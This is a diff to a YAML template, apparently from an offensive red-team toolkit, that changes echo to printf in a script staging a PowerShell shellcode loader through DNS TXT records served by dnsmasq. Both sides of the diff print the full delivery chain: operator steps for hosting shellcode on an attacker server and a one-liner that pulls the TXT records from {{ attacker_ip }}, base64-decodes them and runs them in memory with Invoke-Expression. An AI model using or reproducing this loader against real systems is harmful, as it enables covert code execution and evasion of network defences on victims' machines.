@@ -7,7 +7,7 @@ metadata:
 
 content: |
   bash -c '
-  echo "Creating dnsmasq config. Please wait..."
+  printf '%s\n' "Creating dnsmasq config. Please wait..."
 
   python "{{ templates_dir }}/helper_scripts/chunk-txt_record.py" \
     "{{ include("scripts/powershell-shellcode_loader-staged.yaml") | base64_pwsh }}" 255 "cdn" "example.com" \
@@ -23,14 +23,14 @@ content: |
   cat /tmp/dnsmasq.conf.head /tmp/txt_records.txt > ./dnsmasq.conf
 
   SEP="================================================================"
-  echo "$SEP"
-  echo "                      ------Kali Prep------                      "
-  echo "Start DNS Server: dnsmasq --test -C ./dnsmasq.conf && sudo dnsmasq -C ./dnsmasq.conf"
-  echo "Sanity Check DNS entry: dig +short TXT 0.cdn.example.com @{{ attacker_ip }}"
-  echo "Host your shellcode at \"/favicon.png\""
-  echo "$SEP"
-  echo "                      -----PowerShell-----                      "
-  echo "Deliver & Execute in memory:"
-  echo "Invoke-Expression (([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( ((((0..([int]\$(Resolve-DnsName -Name example.com -Type \"txt\" -Server {{ attacker_ip }} -DnsOnly).Strings[0]))) | % {\$((Resolve-DnsName -Name \$([System.String]\$_+\".cdn.example.com\") -Type txt -Server {{ attacker_ip }} -DnsOnly).Strings)}) -join \"\") ))))"
-  echo "$SEP"
+  printf '%s\n' "$SEP"
+  printf '%s\n' "                      ------Kali Prep------                      "
+  printf '%s\n' "Start DNS Server: dnsmasq --test -C ./dnsmasq.conf && sudo dnsmasq -C ./dnsmasq.conf"
+  printf '%s\n' "Sanity Check DNS entry: dig +short TXT 0.cdn.example.com @{{ attacker_ip }}"
+  printf '%s\n' "Host your shellcode at \"/favicon.png\""
+  printf '%s\n' "$SEP"
+  printf '%s\n' "                      -----PowerShell-----                      "
+  printf '%s\n' "Deliver & Execute in memory:"
+  printf '%s\n' "Invoke-Expression (([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( ((((0..([int]\$(Resolve-DnsName -Name example.com -Type \"txt\" -Server {{ attacker_ip }} -DnsOnly).Strings[0]))) | % {\$((Resolve-DnsName -Name \$([System.String]\$_+\".cdn.example.com\") -Type txt -Server {{ attacker_ip }} -DnsOnly).Strings)}) -join \"\") ))))"
+  printf '%s\n' "$SEP"
   '
